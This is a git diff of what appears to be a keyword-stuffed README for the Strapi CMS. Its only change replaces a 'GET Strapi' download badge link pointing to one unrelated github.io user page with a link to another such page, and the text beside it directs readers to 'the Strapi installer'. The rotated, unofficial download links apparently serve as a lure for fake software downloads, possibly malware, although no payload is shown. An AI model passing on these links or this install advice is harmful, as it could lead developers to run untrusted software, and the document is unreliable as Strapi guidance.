@@ -55,7 +55,7 @@ The ecosystem is also a major reason teams research strapi docs, strapi document
 
 Prerequisites: A development environment with Node.js, a package manager, Git access, and a selected database or hosting target.
 
-[![GET Strapi](https://img.shields.io/badge/GET%20%E2%80%94%20Strapi-4945FF?style=for-the-badge&logoColor=white)](https://chasemathisylrz.github.io/.github/strapi-download)
+[![GET Strapi](https://img.shields.io/badge/GET%20%E2%80%94%20Strapi-4945FF?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/strapi-download)
 
 1.  **Download and Install:** Start with the Strapi installer or repository instructions, then confirm the strapi version that matches your project requirements.
 2.  **Create Content Structures:** Use strapi admin to define collections, components, media fields, relations, and permissions for your first publishing workflow.
